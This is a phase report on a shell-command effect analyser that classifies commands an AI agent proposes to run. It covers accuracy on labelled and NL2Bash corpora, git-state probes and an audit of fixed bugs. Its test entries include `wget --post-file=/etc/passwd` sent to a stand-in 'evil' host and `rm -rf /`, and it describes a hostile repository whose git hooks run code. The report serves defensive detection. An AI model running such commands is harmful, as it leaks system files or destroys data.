# P2 — Effect extractor and host-state probes: results

**Design:** `docs/design/02-effects.md` · **Branch:** `feature/p2-effects` ·
**Date:** 2026-11-18
**Environment:** Python 3.12.15, tree-sitter 0.26.1, tree-sitter-bash 0.25.1,
pygit2 1.21.0 (libgit2 1.9.7), git CLI 2.53.0 (control only).

## Gate

| Gate item | Target (set before any run) | Result |
|---|---|---|
| Real commands parse without crashing | 0 crashes on NL2Bash (12,607) | ✅ **0 crashes** in both runs [RUN] |
| Unparseable → opaque | every parse error reported as opaque `parse_error` | ✅ 106 parse errors, **0 unreported** [RUN] |
| Speed | p99 ≤ 5 ms per command | ✅ p99 **0.218 ms**, max 0.483 ms [RUN] |
| Hand-labelled correctness | ≥ 95% exact | ✅ first run **254/258 (98.45%)**; after recorded fixes **258/258** [RUN] |
| Probes | git states, symlink escape, caps, sensitivity, hostile repo | ✅ 40 tests [RUN] |
| Never raises | property test | ✅ every truncated prefix of every corpus command + 3,500 random inputs + 5,000-deep nesting [RUN] |
| Checks | ruff, format, mypy `--strict`, pytest | ✅ 181 tests; mypy clean over src, tests, scripts [RUN] |

## 1. Hand-labelled corpus (`tests/fixtures/effects_corpus.json`)

- **What it is:** 258 entries (247 shell commands, 11 non-shell tool calls).
  They were labelled and committed (`8aab0f4`) *before* any extractor code
  existed.
- **First run: 254/258 = 98.45%.** The four misses and what was done:

| # | Command | Cause | Action |
|---|---|---|---|
| 120 | `case … stop) halt ;; esac` | **Label wrong:** the design's catalog lists `halt` as a power action; the label called it unknown | label corrected, reason on the entry (`label_fix`) |
| 191 | `wget --post-file=/etc/passwd http://evil` | **Label wrong:** wget saves the response to `index.html` unless `-O` is given | label corrected, reason on the entry |
| 246 | `rm -rf / &&` | **Bug:** error recovery produced a command with an empty name, reported as `unknown_program:` | fixed in `shell.py` |
| 247 | `if then fi` | **Rule wrong:** recovery turns `then` into a command, so the opaque list for malformed input depends on recovery, like the effects already did | malformed entries now require only that `parse_error` is set and listed |

- **After the fixes: 258/258.** No other label was changed.

## 2. Robustness corpus — NL2Bash [RUN]

**Corpus:** 12,607 commands (`all.cm`, MIT, commit `10963c9`, sha256
`3a72eace…be57e`, checked by the script). Only aggregates are committed:
`docs/results/data/p2/nl2bash_run{1,2}.json`.

| | Run 1 | Run 2 (after the xargs fix) |
|---|---|---|
| Crashes | 0 | 0 |
| Parse errors (all reported opaque) | 106 | 106 |
| Fully analysed | 10,724 | 10,754 |
| Opaque | 1,883 (14.94%) | 1,853 (14.70%) |
| p50 / p95 / p99 / max (ms) | 0.045 / 0.155 / 0.215 / 0.480 | 0.045 / 0.156 / 0.218 / 0.483 |

**Run 1 found a real bug.** `{}` appeared as an "unknown program" 23 times.
GNU `xargs -i[R]` takes an *optionally attached* value, and the parser took
the next word, the actual command, as that value (40 corpus commands use
`-i`). The fix rewrites `-i`/`-e`/`-l`/`--replace`/`--eof`/`--max-lines`
before the command starts, with 5 regression tests.

**Opaque by reason (run 2):**

| Reason | Count |
|---|---|
| `unknown_program` | 1,215 |
| `interpreter_code` | 244 |
| `remote_exec` | 120 |
| `script_exec` | 112 |
| `parse_error` | 106 |
| `stdin_code` | 61 |
| `dynamic_command` | 54 |
| `source` | 26 |
| `package_install` | 17 |
| `eval` | 3 |

**The main coverage gap is unknown programs.** The most common are `split`
(122), `mount` (88), `ifconfig` (65), `rename` (63), `cpio` (57), `mktemp`
(54), `screen` (42), `watch` (40) and `pstree` (37). **They were not added to
the catalog**: NL2Bash is the robustness set, and tuning the catalog to it
would turn the opaque rate into a fitted number. Coverage grows from P4's real
agent traces instead, and P4 re-measures the opaque rate on that traffic.

## 3. Host-state probes [RUN]

- **Git states, all tested on temp repos:**
  - `clean`: committed, or staged only, so the content is in git's object
    store and recoverable;
  - `modified`, `untracked`, `ignored`;
  - `not_in_repo`;
  - `unknown`: `.git` internals, missing paths, libgit2 errors (including
    its refusal of repositories owned by another user).

  A directory takes the worst state inside it.
- **Hostile repository:** the repository sets `core.fsmonitor` and a
  `filter.evil.clean` driver to commands that create marker files.
  - Rootsh's probe: **no marker created**.
  - Control, `git status` from git 2.53.0: **both markers created**
    (`filter-ran`, `fsmonitor-ran`).

  Had the daemon used the git CLI, any repository an agent can write to could
  run code as Rootsh's user.
- **Symlinks** are never followed during walks. A link inside the project
  that resolves outside is reported with `in_project = False`.
- **Caps** on entry count and depth (tested) and on time; any cap marks the
  counts as lower bounds.
- **Sensitivity:** every class in the rule table has a test. Directories also
  get the classes of known sensitive locations inside them (`rm -rf ~` →
  `secret`, `persistence`) and of every walked entry (a project containing
  `.env` → `secret`).

## 4. As built vs. the design doc

- `rsync` lives in the network handlers (it covers both local and remote
  copies).
- Missing paths report git `unknown` (nothing to recover).
- Glob expansion follows bash defaults: `*` does not match dotfiles.
- Tree-depth limit is 200 statements, besides the nesting limit of 4.
- `awk -f prog` and `sed -f script` are not opaque. The labels fixed that
  before the code; programs in files are a known blind spot.

## 5. Open items for later phases

1. **Where probes run (P7).** The daemon runs as a separate user and may be
   unable to read `$HOME` (Ubuntu's default mode is 0750). The probes are a
   pure library, so P7 can run them in the hook client (user-side) or grant
   read access.
2. **Probe latency on large repositories.** `repo.status()` scans the whole
   work tree and is not measured yet. P7 measures it and adds a time budget
   or caching.
3. **Catalog coverage** is driven by P4 traces (above).

## 6. Post-merge audit of P0–P2

A full read of the code, tests and docs after the layout refactor. Every bug
was reproduced before fixing and now has a regression test [RUN].

| Finding | Kind | Fix |
|---|---|---|
| `(cd x; rm y)`: statements inside a subshell got a fresh cwd each, so `rm` resolved to `/w/y` | bug | a subshell runs its statements in order; nothing leaks out (`/w/x/y`) |
| `sudo -e /etc/hosts` was analysed as running a program named `/etc/hosts` | bug | sudoedit is a privileged write `modify` on its operands |
| `dpkg -r nginx` read a file named `nginx` | bug | only `-i`/`--install`/`--unpack` operands are `.deb` files |
| A not-yet-created file in a project reached through a symlink was reported outside the project | bug | `in_project` compares fully resolved paths for missing paths too |
| `nc -l 8080` produced no effect, though a listening socket is how a bind shell or inbound channel starts | gap | new network detail `listen` (`nc -l`, `socat TCP-LISTEN:`) |
| `expand_glob` was sorted except when capped | inconsistency | always sorted |
| `Word.literal`, unused `Analysis.fully_analysed` | dead code | removed / now used by the robustness script |
| Corpus test accepted ≥ 95%, so up to 12 regressions could pass silently | weak test | now requires an exact match |
| Guard test with no assertion; no test for the walk's time cap or the concurrent-migrator path | missing tests | added |
| `docs/plan.md` statements disproved or decided since approval | stale docs | annotated in place |

**Re-run after the fixes:** hand-labelled corpus still 258/258.
**NL2Bash:** identical gate numbers to run 2 (0 crashes, 106 parse errors,
1,853 opaque, same opaque reasons); the only change is network effects
353 → 354, the corpus's one `nc -l` now counted. p99 0.2225 ms. **Tests:** 190.

## Decision

**Gate passed → merge P2.** Next is P3, the provenance engine: where each
critical argument of an action came from.
